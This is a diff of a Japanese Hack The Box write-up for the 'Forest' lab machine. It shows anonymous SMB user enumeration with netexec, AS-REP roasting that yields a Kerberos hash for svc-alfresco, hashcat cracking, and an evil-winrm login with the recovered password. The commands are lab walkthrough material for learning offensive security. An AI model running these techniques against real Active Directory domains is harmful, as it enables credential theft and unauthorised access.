@@ -68,7 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
 ## STEP 2
 anonymousでユーザ列挙できた
 ```sh
-└─$ netexec smb 10.129.95.210 -u '' -p '' --users
+└─$ netexec smb -u '' -p '' --users 10.129.95.210
 SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
 SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
 SMB         10.129.95.210   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
@@ -107,29 +107,11 @@ SMB         10.129.95.210   445    FOREST           [*] Enumerated 31 local user
 ```
 先ほどのユーザからパスワードが設定されているものでasreproastしてみると、svc-alfrescoのチケットを取得できた
 ```sh
-└─$ impacket-GetNPUsers -output hash.txt -usersfile user.txt -no-pass -dc-ip 10.129.95.210 htb.local/
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+└─$ netexec ldap -u user.txt -p '' --asreproast hash.txt 10.129.95.210
+LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb19a093db509a3ee92654df112839cc$0dd5ff910de59a4a493ccd35c2041ba09030a48456f83526b167a68de43e50d4296132ad2f1105edc8da7c403622748b1be39d3764d4a55f47692a11a0d3a22a930f99e8fcb2946479c1941a64dc3365574dac8eb90c6809f600b2208d23e3115913bffd939b882f9388e85686bdc9193eb995dbf08ce66477a908f8796d9b1de64b01542b14f87ae923624aa948d694a515631cc65409c9cd226cb15a68665075b64b16d93518a69669a2aa49d762bb1f01165de9a2c1589be998123d0dbf3f38b65a4c663983c0a3f63da157482050b5525bb8bba82e6df2d67699c1981f229f8ac61ba1b3
-[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc901cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e
 ```
 クラック成功！
 ```sh
@@ -211,6 +193,7 @@ Cracking performance lower than expected?
 [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Sat Jul  5 09:42:18 2025
 Stopped: Sat Jul  5 09:42:39 2025
 ```
+5985番ポートが開いていたので、取得したクレデンシャルでログイン成功！ユーザフラグゲット
 ```sh
 └─$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
                                         
